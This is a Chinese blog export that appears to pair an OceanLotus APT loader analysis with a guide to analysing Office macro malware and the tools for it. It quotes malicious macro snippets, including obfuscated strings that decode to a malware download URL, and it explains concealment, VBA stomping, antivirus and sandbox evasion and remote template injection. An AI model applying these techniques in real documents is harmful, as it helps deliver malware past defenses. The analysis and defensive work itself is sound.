逆向分析Dll文件共有6个导出函数，除dll入口函数“DllEntryPoint”外，其余都为空函数。 样本执行函数在dll入口函数“DllEntryPoint”中，文件创建互斥体，将shellcode赋值给局部变量。 解密文件部分可执行代码，填充部分执行代码为无用代码。 修改执行代码逻辑，使实际执行的地址指向函数开始加载的shellcode的位置，此部分功能为通过自定义算法比较文件名称是否为0x195B7195或0xED8FC4C4，动态获取LoadlibraryW地址，重新加载mscoree.dll模块。 样本加载资源段，资源段中的内容实际为shellcode代码，加载资源后放入申请的内存空间，创建线程指向内存空间起始地址，执行资源段释放的代码。 资源段释放的代码执行内容如下： 使用自定义算法比较函数签名，加载此阶段所需的函数。程序需要的部分自定义函数签名和对应的函数API如下： 函数签名 对应函数名称 0xCF4448F7 advapi32.CryptAcquireContextW 0xDC15ED5E advapi32.CryptHashData 0x839430e4 advapi32.CryptGetHashParm 0xEDF612B2 advapi32.CryptDestroyHash 0x736CA443 advapi32.CryptReleaseContext 0x79b07498 ntdll_12.RtlCompareMemory 调用API，计算“fnplicensingservice.exe”的hash，和调用此dll的进程名称hash比较是否相等，如果不相等会直接退出程序。比较的hash值为：422C9F1DFB3894415012C6DD1F2D0E21 获取用户计算机名称，将计算机名称中的大写字母转换为小写字母，并计算计算机名的hash 根据计算机名称计算出的hash作为key解密代码。","categories":[{"name":"APT组织","slug":"APT组织","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/"},{"name":"海莲花组织","slug":"APT组织/海莲花组织","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87/"},{"name":"逆向","slug":"APT组织/海莲花组织/逆向","permalink":"http://wayoka.github.io/categories/APT%E7%BB%84%E7%BB%87/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://wayoka.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"APT组织","slug":"APT组织","permalink":"http://wayoka.github.io/tags/APT%E7%BB%84%E7%BB%87/"},{"name":"海莲花组织","slug":"海莲花组织","permalink":"http://wayoka.github.io/tags/%E6%B5%B7%E8%8E%B2%E8%8A%B1%E7%BB%84%E7%BB%87/"},{"name":"Windows病毒分析","slug":"Windows病毒分析","permalink":"http://wayoka.github.io/tags/Windows%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"宏病毒分析技巧整理","slug":"宏病毒分析技巧整理","date":"2020-11-12T10:09:33.000Z","updated":"2021-10-29T10:16:29.248Z","comments":false,"path":"2020/11/12/宏病毒分析技巧整理/","link":"","permalink":"http://wayoka.github.io/2020/11/12/%E5%AE%8F%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7%E6%95%B4%E7%90%86/","excerpt":"1. 关于宏 宏病毒是一种常见的计算机病毒，寄存在文档或模板中，但是并不会直接感染可执行程序。其诞生于上世纪90年代，自其诞生之日，各种各样的宏病毒不断在网络上涌现。早期的宏病毒是病毒先驱者们展现高超技术的舞台，只感染文档文件，随着时间的推移，宏病毒的危害也越来越大，宏病毒不再只是感染文档文件，而成为了分发恶意程序的常规途经。宏病毒的执行简易隐蔽快速，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行。 对于攻击者而言，宏病毒是一把利器，尤其是结合了社会工程学的宏病毒。如乌克兰电网事件（BlackEnergy），工作人员只是打开了一篇看似很正常的文档，然后便造成了无法挽回的损失。不只是Bl","text":"1. 关于宏&emsp;宏病毒是一种常见的计算机病毒，寄存在文档或模板中，但是并不会直接感染可执行程序。其诞生于上世纪90年代，自其诞生之日，各种各样的宏病毒不断在网络上涌现。早期的宏病毒是病毒先驱者们展现高超技术的舞台，只感染文档文件，随着时间的推移，宏病毒的危害也越来越大，宏病毒不再只是感染文档文件，而成为了分发恶意程序的常规途经。宏病毒的执行简易隐蔽快速，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行。 &emsp;对于攻击者而言，宏病毒是一把利器，尤其是结合了社会工程学的宏病毒。如乌克兰电网事件（BlackEnergy），工作人员只是打开了一篇看似很正常的文档，然后便造成了无法挽回的损失。不只是BlackEnergy，近来肆虐的各种各样的勒索软件，都离不开Office宏的帮助。借助传统的宏病毒，一旦用户打开含有宏病毒的文档，其中的宏病毒就会被执行，释放并激活恶意软件 1.1 宏&emsp;广义上的宏指的是一些命令组织在一起，作为一个单独命令完成一个特定任务；狭义上的宏指office系列办公软件中的宏，本文中提及到的宏都是office办公软件下的宏。 &emsp;Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。 1.2 宏病毒&emsp;在计算机技术的历史中，宏病毒（英语：Macro virus）是一种使得应用软件的相关应用文档内含有被称为宏的可执行代码的病毒。一个电子表格程序可能允许用户在一个文档中嵌入“宏命令”，使得某种操作得以自动运行；同样的操作也就可以将病毒嵌入电子表格来对用户的使用造成破坏。 &emsp;宏病毒的另一个特别危险的特征体现于它们有时能够感染运行不同操作系统平台上的的电脑。比如Microsoft Word宏病毒可以感染使用微软公司视窗系统的Word用户，同样也可以感染使用苹果公司Macintosh电脑的用户。 &emsp;绝大多数的宏病毒都是根据微软公司系列软件所特有的宏功能所编写，这一方面是因为其他应用软件对编写宏病毒来说十分困难，另一方面也是因为微软公司系列软件得到了最广泛的使用，以致于它们成为了这些电脑病毒的首要目标。 &emsp;值得一提的是目前的一些攻击诸如水坑攻击、鱼叉攻击等都会通过宏利用方式投递下一步控制的恶意样本。 2. office文件格式&emsp;要认识宏病毒就要了解宏病毒是如何在office系列办公软件中运行的，这就需要对office系列办公软件的文件格式有所了解。 &emsp;微软最初使用的是OLE文件格式，OLE文件数据管理方式类似磁盘管理，该方式能够有效组装各个零件，但是却不够灵活。在office2007中，微软推出了OpenXML文件格式，该文件格式其实是标准的压缩文件格式，通过XML组装各个零件。OpenXML文件格式足够灵活，同时也“解决”了office文档最大的安全问题——宏病毒威胁，微软将所有宏相关的内容都放进了vbaProject.bin文件中，只要文件中不包含vbaProject.bin，就不可能含有宏，也就不可能是宏病毒。于是，微软推出了以x结尾(docx)和以m结尾(docm)的两大类文档文件，这两类文件均是OpenXML文件，但是以x结尾的文件中不含有vbaProject.bin。 2.1 OpenXML及OLE&emsp;目前office系列办公软件使用最多的是word、Excel、PowerPoint(PPT)文件，其默认均采用OpenXML格式，。OpenXML在2006年12月成为了ECMA规范的一部分，编号为ECMA376；并于2008年4月通过国际标准化组织的表决，并于两个月后公布为ISO／IEC 29500国际标准。 &emsp;另一种结构是office 97-03的存储规范：OLE。它是一种对象链接和嵌入的技术，该技术可以包含文本，图形，电子表格甚至其他二进制数据。关于Word、Excel 和 PowerPoint 的文件格式参考请参考链接Word、Excel 和 PowerPoint 的文件格式参考。 &emsp;Office文档（如：.doc、.ppt、.xls等）很多是复合文档（OLE文件），所有文件数据都是存储在一个或多个流中。每个流都有一个相似的数据结构，用于存储元数据的数据结构。这些元数据有用户和系统的信息、文件属性、格式信息、文本内容、媒体内容。宏代码信息也是以这种方式存储在复合文档中的。为了在Office文档文件中提取出宏代码，必须能够解析复合文档的二进制格式，下面以word为例，分析复合文档的二进制结构。 &emsp;.doc文件是一种普通的OLE文件(复合文件)，能够包含宏。而.docx和.docm文件，实际上都是是压缩文件 目前本人已知的可以在office办公系列的文件格式中启用宏的文件后缀为doc、xls、ppt及文件后缀最后字母为m的文件；攻击者使用最多的文件格式为doc、xls，还有部分docx、xlsx类型的远程模板注入。 3. 宏病毒惯用对抗手段3.1 自动执行&emsp;宏病毒分析的第一步是定位自动执行入口。宏病毒具有自动执行的特性，特别是含有AutoOpen的宏，一旦用户打开含有宏的文档，其中的宏就会被执行，而用户一无所知。宏病毒的激发机制有三种：利用自动运行的宏，修改Word命令和利用Document对象的事件。 &emsp;宏病毒中常用的自动执行方法有两种：一种是用户执行某种操作时自动执行的宏，如Sub botton(),当用户单击文档中的按钮控件时，宏自动执行；另一种则是Auto自动执行，如Sub AutoOpen()和Sub AutoClose()，分别在文档打开和关闭时自动执行。 3.2 隐秘执行宏病毒利用几行代码就可以实现隐秘，下面程序为宏病毒通过阻止弹出各类提示，防止用户发现宏正在运行来实现自我隐藏： 123On Error Resume Next &#x27;如果发生错误，不弹出错误对话框Application.DisplayStatusBar = False &#x27;进制显示状态栏Options.SaveNormalPrompt = False &#x27;修改公用模板时自动保存，不弹出提示 宏病毒自我隐藏还有一种方式，那就是屏蔽菜单按钮和快捷键，普通用户即使猜测到有宏正在运行，也无法取消正在执行中的宏，查看宏信息。下表是笔者总结的宏病毒采取的隐蔽执行的一些措施： 代码 措施 On Error Resume Next 如果发生错误 不弹出错误对话框 Application.DisplayStatusBar=False 不显示状态栏 避免显示宏的运行状态 Opition.SaveNormalPrompt=False 修改公用模版时在后台自动保存 不给任何提示 EnableCancelKey=wdCancelDisabled 使不可以通过ESC键取消正在执行的宏 Application.SreenUpdating=0 不让屏幕更新 使病毒执行不影响计算机速度 Application.DisplayAlerts=wdAlertsNone 不让Excel弹出报警信息 CommandBars(“Tools”).Controls(“Marco”).Enable=0 屏蔽工具菜单中的宏按钮 CommandBars(“Marco”).Controls(“Security”).Enable=0 屏蔽宏菜单中的安全性 CommandBars(“Marco”).Controls(“Marco”).Enable=0 屏蔽宏菜单中的宏 CommandBars(“Tools”).Controls(“Customize”).Enable=0 屏蔽工具菜单的自定义 CommandBars(“View”).Controls(“Toolsbars”).Enable=0 屏蔽视图宏菜单的工具栏 CommandBars(“format”).Controls(“Object”).Enable=0 屏蔽格式菜单的对象 3.3 调用外部例程和命令执行&emsp;宏病毒的强大主要来自与对Windows API和外部例程的调用，通过对大量样本的分析，本文总结出一张宏病毒调用的外部例程表。 外部例程 介绍 MSXML2.ServerXMLHTTP Xmlhttp是一种浏览器对象， 可用于模拟http的GET和POST请求 Net.WebClient 提供网络服务 Adodb.Stream Stream 流对象用于表示数据流。配合XMLHTTP服务使用Stream对象可以从网站上下载各种可执行程序 Wscript.shell WScript.Shell是WshShell对象的ProgID，创建WshShell对象可以运行程序、操作注册表、创建快捷方式、访问系统文件夹、管理环境变量。 Poweshell PowerShell.exe 是微软提供的一种命令行shell程序和脚本环境 Application.Run 调用该函数，可以运行.exe文件 WMI 用户可以利用 WMI 管理计算机，在宏病毒中主要通过winmgmts:.\\root\\CIMV2隐藏启动进程 Shell.Application 能够执行sehll命令 如下所示，使用Wscript.shell实现命令执行功能： 123456Set oWshell = CreateObject(&quot;WScript.Shell&quot;)If ValueTpe = &quot;&quot; Then oWshell.Regwrite strkey,ValueElse oWshell.Regwrite strkey,Value,ValueTypeEnd If 上表中Wscript.shell、Poweshell、Application.Run、Shell.Application这些外部例程都可以用来执行命令，除此之外，一些API如：Shell( )、CallWindowProc( )也常用于执行命令。 3.4 字符串隐写&emsp;宏病毒分析比较简单，这是因为任何能执行宏的用户都能查看宏源码，分析人员轻而易举就分析出宏病毒的行为。通过扫描宏中特征字符串，杀软也很容易检测出宏病毒。宏病毒的开发者们便想尽办法隐藏这些特征字符串，下面本文就对宏病毒中这些字符串的隐写方式进行分析。 3.4.1 Chr()函数Chr()，返回以数值表达式值为编码的字符（例如：Chr(70)返回字符‘F’）。使用Chr函数是最常见的字符串隐写技术,利用ascii码，逃避字符串扫描。如下列代码： 1Nrh1INh1S5hGed = &quot;h&quot; &amp; Chr(116) &amp; Chr(61) &amp; &quot;t&quot; &amp; Chr(112) &amp;Chr(58) &amp; Chr(47) &amp; Chr(59) &amp; Chr(47) &amp; Chr(99) &amp; Chr(104) &amp; Chr(97) &amp; &quot;t&quot; &amp; Chr(101) &amp; Chr(97) &amp; Chr(117) &amp; Chr(45) &amp; Chr(100) &amp; Chr(60) &amp; Chr(101) &amp; Chr(115) &amp; Chr(45) &amp; Chr(105) &amp; Chr(108) &amp; &quot;e&quot; &amp; Chr(115) &amp; Chr(46) &amp; Chr(61) &amp; Chr(99) &amp; Chr(111) &amp; Chr(109) &amp; Chr(47) &amp; Chr(60) &amp; Chr(52) &amp; Chr(116) &amp; Chr(102) &amp; Chr(51) &amp; Chr(51) &amp; Chr(119) &amp; Chr(47) &amp; Chr(60) &amp; Chr(119) &amp; &quot;4&quot; &amp; Chr(116) &amp; Chr(52) &amp; Chr(53) &amp; Chr(51) &amp; Chr(46) &amp; Chr(59) &amp; Chr(101) &amp; Chr(61) &amp; Chr(120) &amp; Chr(101) 上列代码使用了大量的Chr函数，看似很复杂，实际上就只是一串字符串“ht=tp:/;/chateau-d&lt;es-iles.=com/，4tf33w/&lt;w4t453.;e=xe”。Nrh1INh1S5hGed字符串看着很像一个链接，但是中间多了几个字符，其实处理起来很简单，只要将多余字符删掉就好。将这串字符串命名为Nrh1INh1S5hGed也是为了混淆，但是对于宏病毒分析人员来说，这种混淆并没有增加分析难度，分析人员只需要 全选–查找–替换。 Chr()函数还可以利用表达式，增加技术人员的分析难度： Ndjs = Sgn(Asc(317 - 433) + 105） ATTH = Chr(Ndjs) + Chr(Ndjs + 12) + Chr(Ndjs + 12) + Chr(Ndjs + 8) 经过分析发现，上述代码的字符串是：“http://” 3.4.2 Replace()函数Replace函数的作用就是替换字符串，返回一个新字符串，其中某个指定的子串被另一个子串替换。 承接上文，把Nrh1INh1S5hGed中多余字符去掉，这里使用Replace函数把多余字符替换为空 1Nrh1INh1S5hGed = Replace(Replace(Replace(Nrh1INh1S5hGed,Chr(60), &quot;&quot;), Chr(61), &quot;&quot;), Chr(59), &quot;&quot;) 处理之后：Nrh1INh1S5hGed=“http://chateau-des-iles.com/4tf33w/w4t453.exe” 可以很清晰看出Nrh1INh1S5hGed是一个下载名为w4t453可执行文件的链接。可以猜测w4t453.exe是一个恶意程序，之后一定会执行w4t453.exe。在用户一无所知的情况下，宏已经完成了入侵工作。 3.4.3 CallByname()函数CallByname函数允许使用一个字符串在运行时指定一个属性或方法。CallByName 函数的用法如下： 1Result = CallByName(Object, ProcedureName, CallType, Arguments()) CallByName 的第一个参数包含要对其执行动作的对象名。第二个参数，ProcedureName，是一个字符串，包含将要调用的方法或属性过程名。CallType 参数包含一个常数，代表要调用的过程的类型：方法 (vbMethod)、property let (vbLet)、property get (vbGet)，或 property set (vbSet)。最后一个参数是可选的，它包含一个变量数组，数组中包含该过程的参数。 例如：**CallByName Text1, “Move”, vbMethod, 100, 100就相当于执行Text1.Move(100,10) **这种隐藏的函数执行增加了分析的难度。 CallByName的作用不仅仅在此，在下面的这个例子中，利用callByName，可以用脚本控制控件: 1234567891011121314151617181920212223Dim obj As Object[/align] Set obj = Me Set obj = CallByName(obj, &quot;Text1&quot;, VbGet) Set obj = CallByName(obj, &quot;Font&quot;, VbGet) CallByName obj, &quot;Size&quot;, VbLet, 50 &#x27;以上代码=&quot;Me.Text1.Font.Size = 50&quot; Dim obj As Object Dim V As String Set obj = Me Set obj = CallByName(obj, &quot;Text1&quot;, VbGet) Set obj = CallByName(obj, &quot;Font&quot;, VbGet) V = CallByName(obj, &quot;Size&quot;, VbGet) &#x27;以上代码=&quot;V = Me.Text1.Font.Size&quot; 3.4.4 Alias替换函数名Alias子句是一个可选的部分，用户可以通过它所标识的别名对动态库中的函数进行引用。 1Public Declare Function clothed Lib &quot;user32&quot; Alias &quot;GetUpdateRect&quot; (prestigiation As Long, knightia As Long, otoscope As Long) As Boolean 如上例所示，clothed作为GetUpdateRect的别名，调用clothed函数相当于调用user32库里的GetUpdateRect函数。事实上喜欢使用别名的不仅仅是宏病毒制造者，普通的宏程序员也喜欢使用别名。使用别名的好处是比较明显的，一方面Visual Basic不允许调用以下划线为前缀的函数，然而在Win32 API函数中有大量C开发的函数可能以下划线开始。使用别名可以绕过这个限制。另外使用别名有利于用户命名标准统一。对于一些大小写敏感的函数名，使用别名可以改变函数的大小写。 3.4.5 利用窗口、控件隐藏信息控件在宏程序里很常见，有些宏病毒的制造者们便想到利用控件隐藏危险字符串。控件里存放着关键字符串，程序用到上述字符串时，只需要调用标签控件的caption属性。 控件的各个属性（name、caption、controtiptext、等）都可以成为危险字符串的藏身之所。而仅仅查看宏代码，分析者无法得知这些字符串内容，分析者必须进入编辑器查看窗体属性，这大大增加了分析的难度。 3.4.6 利用文件属性这种方式和利用窗体属性的方式类似，就是将一切能存储数据的地方利用起来。就像Demo3中读取文件详细信息中的备注 3.4.7 恶意行为字符串不同的宏病毒执行不同的恶意行为，但这些恶意行为是类似的，它们使用的代码往往是相似的。通过大量的样本分析，笔者总结了一些宏病毒执行危险操作时代码中含有的字符串，详见下表： 字符串 描述 http URL连接 CallByName 允许使用一个字符串在运行时指定一个属性或方法，许多宏病毒使用CallByName执行危险函数 Powershell 可以执行脚本，运行.exe文件，可以执行base64的命令 Winmgmts WinMgmt.exe是Windows管理服务，可以创建windows管理脚本 Wscript 可以执行脚本命令 Shell 可以执行脚本命令 Environment 宏病毒用于获取系统环境变量 Adodb.stream 用于处理二进制数据流或文本流 Savetofile 结合Adodb.stream用于文件修改后保存 MSXML2 能够启动网络服务 XMLHTTP 能够启动网络服务 Application.Run 可以运行.exe文件 Download 文件下载 Write 文件写入 Get http中get请求 Post http中post请求 Response http中认识response回复 Net 网络服务 WebClient 网络服务 Temp 常被宏病毒用于获取临时文件夹 Process 启动进程 Cmd 执行控制台命令 createObject 宏病毒常用于创建进行危险行为的对象 Comspec %ComSpec%一般指向你cmd.exe的路径 3.5 VBA StompingVBA 在 Office 文档中可以以下面三种形式存在 源代码: 宏模块的原始源代码被压缩，并存储在模块流的末尾。可以删除源代码，并不影响宏的执行 P-Code: 与 VB 语言相同，VBA 同样有 P-Code，通过内置的 VB 虚拟机来解释 P-Code 并执行，平常我们 Alt+F11 打开所看到的正是反编译的 P-Code。 ExeCodes: 当 P-Code 执行一次之后，其会被一种标记化的形式存储在 SRP 流中,之后再次运行时会提高 VBA 的执行速度，可以将其删除，并不影响宏的执行。 &emsp;每一个流模块中都会存在一个未被文档化的 PerformanceCache，其中包含了被编译后的 P-Code 代码，如果 _VBA_PROJECT 流中指定的 Office 版本与打开的 Office 版本相同，则会忽略流模块中的源代码，去执行 P-Code 代码 &emsp;VBA Stomping 是一种可以绕过反病毒检测恶意文档生成技术，它最初由 Vesselin Bontchev 博士引起我们的注意（见此处）。VBA stomping 是指销毁 Microsoft Office 文档中的 VBA 源代码，只留下文档文件中称为 p-code 的宏代码的编译版本。在这种情况下，仅基于VBA源代码的恶意文档检测会失败。 &emsp;在宏文件中，我们看到的宏代码只是一些字符串，真正执行的其实是真正的代码，也就是p-code。只要 p-code 与系统上的当前 VBA 版本兼容，文档实际执行的是存储的 p-code。此外，宏编辑器中显示的内容（一旦启用内容）并不是解压的 VBA 源代码，而是反编译的 p-code。在这种情况下，攻击者可以通过用零或随机字节覆盖 VBA 源代码来完全擦除（stomp），而不仅仅是修改它。 &emsp;但是，如果我们在不同版本的 Word（使用不同的 VBA 版本）中打开文档，则 p-code 将不可重用。这将强制将 VBA 源代码解压缩并重新编译为 p-code。 &emsp;使用 VBA Stomping 技术的恶意文档只能使用用于创建文档时相同的 VBA 版本执行。 我们可以通过在恶意文档生成之前对目标进行侦察来确定要使用的适当 Office 版本；或者通过生成具有多个 Office 版本的恶意文档并将其投递到目标上来解决此限制。 &emsp;Office 文档包含两个用于提取 VBA 的位置，即压缩的 VBA 源代码和 p-code。下表详细说明了在以下情况下使用哪个 VBA 数据源： &emsp;从该表中我们可以看到，如果我们有有效的 p-code，则在启用宏时它会忽略压缩的 VBA 源代码，并通过运行 p-code 来执行所有宏功能。作为攻击者，这告诉我们，我们可以完全破坏或修改压缩的 VBA 源代码，并且仍然让我们的恶意文档执行其指定的任务。 3.6 规避杀软 目前杀软查杀 VBA 基本上都是静态查杀，所以静态免杀至关重要，从源头上讲 Word 是一个 zip 文件，解压之后的 vbaProject.bin 包含着要执行的宏信息，也是杀软的重点关注对象，可以修改该文件名用于规避检测，步骤分以下三步 将“vbaProject.bin”重命名为“[重命名].txt” 更新“word / _rels / document.xml.rels”中的关系 在“[Content_Types] .xml”中，将“bin”替换为“txt” &emsp;很多诱饵文档喜欢在 VBA 中启动脚本程序执行 ps 或者从网络上下载一段 shellcode 或恶意程序等等，这样非常容易被杀软的行为拦截拦住，同时沙箱可以根据进程链和流量判定该 word 文档是恶意的，安全分析人员可以轻易的通过监控进程树的方式观察恶意行为。 使用 WMI 来执行后续攻击链，由 WMI 启动的进程的父进程为 wmiprvse.exe 而不是 word.exe 这样就可以与恶意 word 文档取消关联，规避检测。 动态检测沙箱可以利用 dotnet 属性以及 WMI 来检测 Office：是否含有最近的文档，正在运行的任务数，特定进程检查（vbox，vmware 等等），检测备用数据流（ADS），判断计算机是否是域的一部分（Win32_ComputerSystem 类中 PartOfDomain 对象），检测 Bios 信息，检测即插即用信息（Win32_PnPEntity），检查用户名，检测文件名 hash，检测文件名是否被易名，检测 CPU 核心（Win32_Processor），检测应用及个数。 4. 远程模板注入&emsp;远程模板注入宏病毒更多使用在OpenXML文件格式中，文件中不包含vbaProject.bin，就无法在本地加载宏；素以攻击者使用远程模板注入技术加载执行宏。 &emsp;远程模板注入技术在打开docx文件时，此docx文件会打开一个远程站点上的dotm文件，而以m结尾的文档文件是可能携带宏的。 4.1 远程模板注入原理4.1.1 docx文件格式解析将docx文件解压后，可以发现docx文件的格式如下： 其结构解释如下： 其中document.xml.rels和settings.xml.rels一样都是用于定位文档各零件的。在rels文件Relationship标签中，Target表示零件的文件位置，正常情况下，给值是相对路径，且存在于压缩包中： 通过恶意构造Target，使其执行远程文件，就可以打开远程文件： 5. 宏分析工具5.1 oletools&emsp;oletools下载地址请 点击 &emsp;python-oletools是python工具包，用于分析Microsoft OLE2文件（也称为结构化存储，复合文件二进制格式或复合文档文件格式），例如Microsoft Office文档或Outlook邮件，主要用于恶意软件分析和调试。它基于 OleFileIO_PL解析器。有关 更多信息，请参见 http://www.decalage.info/python/oletools。 5.1.1 oletools 模块及使用方法 olebrowse：一个简单的GUI，可以浏览OLE文件（例如MS Word，Excel，Powerpoint文档），以查看和提取单个数据流。 oleid：分析OLE文件以检测可能表明该文件可疑或恶意的特定特征的工具。 pyxswf：用于检测，提取和分析可能嵌入在MS Office文档（例如Word，Excel和RTF）等文件中的Flash对象（SWF）的工具，该工具对于恶意软件分析特别有用。 rtfobj：从RTF文件提取嵌入式对象的工具和python模块。 和其他一些（即将推出） olebrowse： &emsp;一个简单的GUI，可浏览OLE文件（例如MS Word，Excel，Powerpoint文档），以查看和提取单个数据流。 1python olebrowse.py [文件] &emsp;如果您提供一个文件，它将被打开，否则将出现一个对话框，让您浏览文件夹以打开文件。然后，如果它是有效的OLE文件，将显示数据流列表。您可以选择一个流，然后在内置的十六进制查看器中查看其内容，或将其保存到文件中以进行进一步分析。 oleid： &emsp;oleid是一个脚本，用于分析OLE文件（例如MS Office文档）（例如Word，Excel），以检测特定特征，就安全性（例如恶意软件）而言，这些特征可能表明该文件可疑或恶意。例如，它可以检测VBA宏，嵌入式Flash对象，碎片。 1python oleid.py [文件] 例如： 12345678910111213&gt; C:\\oletools&gt;oleid.py word_flash_vba.docFilename: word_flash_vba.docOLE format: TrueHas SummaryInformation stream: TrueApplication name: Microsoft Office WordEncrypted: FalseWord Document: TrueVBA Macros: TrueExcel Workbook: FalsePowerPoint Presentation: FalseVisio Drawing: FalseObjectPool: TrueFlash objects: 1 pyxswf： &emsp;pyxswf是一个脚本，用于检测，提取和分析可能嵌入在诸如MS Office文档（例如Word，Excel）之类的文件中的Flash对象（SWF文件），这对于恶意软件分析特别有用。 &emsp;它可以通过正确解析其OLE结构从MS Office文档中提取流，这在流被分段时是必需的。流分段是一种已知的混淆技术，如 http://www.breakingpointsystems.com/resources/blog/evasion-with-ole2-fragmentation/所述 &emsp;通过解析以十六进制格式（-f选项）编码的嵌入式对象，它也可以从RTF文档中提取Flash对象。 &emsp;为此，只需添加-o选项以在OLE流而不是原始文件上工作，或者添加-f选项以在RTF文件上工作。 用法如下： 12345678910111213pyxswf.py [选项] &lt;file.bad&gt;选项： -o，--ole解析OLE文件（例如Word，Excel）在每个流中查找SWF -f，--rtf解析RTF文件以查找对于每个嵌入式对象 -x中的SWF，--extract提取嵌入式SWF，将其命名为MD5HASH.swf并将其保存在工作目录中。不需要其他args -h，--help显示此帮助消息并退出 -y，--yara使用yara扫描SWF。如果SWF被压缩，则将放气。未加ARGS需要 -s，--md5scan扫描SWF以获取MD5签名。请参阅funccheckMD5定义哈希。不需要附加args -H，--header显示SWF文件头。不需要其他args -d，--decompress压缩压缩的SWFS文件 -r PATH，--recdir = PATH 将递归扫描目录以查找包含SWF的文件。必须在引号中提供路径 -c，--compress 使用Zlib压缩SWF 例1： 12345678910&gt; C:\\oletools&gt;pyxswf.py -o word_flash.docOLE stream: &#x27;Contents&#x27;[SUMMARY] 1 SWF(s) in MD5:993664cc86f60d52d671b6610813cfd1:Contents [ADDR] SWF 1 at 0x8 - FWS Header&gt; C:\\oletools&gt;pyxswf.py -xo word_flash.docOLE stream: &#x27;Contents&#x27;[SUMMARY] 1 SWF(s) in MD5:993664cc86f60d52d671b6610813cfd1:Contents [ADDR] SWF 1 at 0x8 - FWS Header [FILE] Carved SWF MD5: 2498e9c0701dc0e461ab4358f9102bc5.swf 例2： 123456C:\\oletools&gt;pyxswf.py -xf &quot;rtf_flash.rtf&quot;RTF embedded object size 1498557 at index 000036DD[SUMMARY] 1 SWF(s) in MD5:46a110548007e04f4043785ac4184558:RTF_embedded_object_000036DD [ADDR] SWF 1 at 0xc40 - FWS Header [FILE] Carved SWF MD5: 2498e9c0701dc0e461ab4358f9102bc5.swf rtfobj： &emsp;rtfobj是一个Python模块，用于从RTF文件中提取嵌入式对象，例如OLE对象。它可以用作Python库或命令行工具。 使用方法如下： 1rtfobj.py &lt;file.rtf&gt; &emsp;它提取并解码RTF文档中编码为十六进制的所有数据块，并将它们保存为名为“ object_xxxx.bin”的文件，其中xxxx是对象在RTF文件中的位置。 &emsp;用作python模块：rtf_iter_objects（filename）是一个迭代器，它生成一个元组（索引，对象），该元组提供RTF文件中每个十六进制流的索引以及相应的解码对象。例： 123import rtfobjfor index, data in rtfobj.rtf_iter_objects(&quot;myfile.rtf&quot;): print &#x27;found object size %d at index %08X&#x27; % (len(data), index) 5.2 oledumpoledump.py是用于分析OLE文件（复合文件二进制格式）的程序。这些文件包含数据流。oledump允许您分析这些流。 许多应用程序都使用这种文件格式，最著名的是MS Office。.doc，.xls，.ppt等是OLE文件（docx，xlsx等是新文件格式：ZIP中的XML）。 oledump有一个嵌入式手册页：运行oledump.py -m进行查看。 在.xls文件上运行oledump，它将向您显示流： 流7、8、9和10旁边的字母M表示该流包含VBA宏。 转储一个流的内容： 1oledump.py -s 流序号(例如 1) xx.xls 效果如下： VBA宏的源代码在存储在流中时会被压缩。使用选项-v解压缩VBA宏： 使用如下： 1oledump.py -s 流序号(例如 1) -v xx.xls 效果如下： 5.2.1 oledump额外的插件 plugin_http_heuristics.py 插件plugin_http_heuristics.py使用一些技巧从恶意的，模糊的VBA宏中提取URL，如下所示： 1oledump.py -p plugin_http_heuristics.py xxx.zip 效果如下： &emsp;您可能已经注意到，上面的屏幕快照中分析的文件是一个zip文件。像我的许多分析程序一样，oledump.py可以分析zip文件（受密码保护）中的文件。这使您可以将恶意软件样本存储在受密码保护的zip文件（受密码感染）中，然后进行分析，而无需提取它们。 YARA Python 模块 如果安装YARA Python模块，则可以使用YARA规则扫描流： 12&gt; type contains_pe_file.yara&gt; oledump.py -y contains_pe_file.yara xxx.xls 效果如下： decode_xor1.py &emsp;如果您怀疑流的内容已编码，例如使用XOR编码，则可以尝试使用我提供的简单解码器对XOR密钥进行暴力破解（或者您可以使用Python开发自己的解码器）： 1&gt; oledump.py -y contains_pe_file.yara -D decode_xor1.py xxx.xls 效果如下： 该程序需要Python模块OleFileIO_PL：http : //www.decalage.info/python/olefileio 5.3 pcodedmp它不是众所周知的，但是用VBA（Visual Basic for Applications； Microsoft Office中使用的宏编程语言）编写的宏以三种不同的可执行形式存在，每种形式都可以是实际在运行时执行的形式，具体取决于环境。这些形式是： 源代码。宏模块的原始源代码被压缩并存储在模块流的末尾。这使得查找和提取相对容易，并且大多数免费的DFIR工具（例如oledump或olevba）甚至许多专业的防病毒工具都只看这种形式的宏分析。但是，大多数情况下，Office会完全忽略源代码。实际上，可以删除源代码（并因此使所有这些工具都认为没有宏），但是宏仍将执行而不会出现任何问题。我已经创建了概念证明说明这一点。大多数工具在此存档中的文档中都看不到任何宏，但是如果使用相应的Word版本（与文档名称匹配）打开，它将显示一条消息并启动calc.exe。令人惊讶的是，恶意软件作者并未更广泛地使用此技巧。 P-code。将每条VBA行输入到VBA编辑器中后，立即将其编译为P-code（堆栈机的伪代码）并存储在模块流中的其他位置。P-code正是大多数时间执行的代码。实际上，即使在VBA编辑器中打开宏模块的源代码时，显示的也不是解压缩的源代码，而是反编译为源代码的P-code。只有在使用与创建该文档使用的VBA版本不同的Office版本的Office版本下打开该文档时，才将存储的压缩源代码重新编译为P-code，然后执行该P-code。这样就可以在任何支持VBA的Office版本上打开包含VBA的文档，并使其中的宏保持可执行状态， 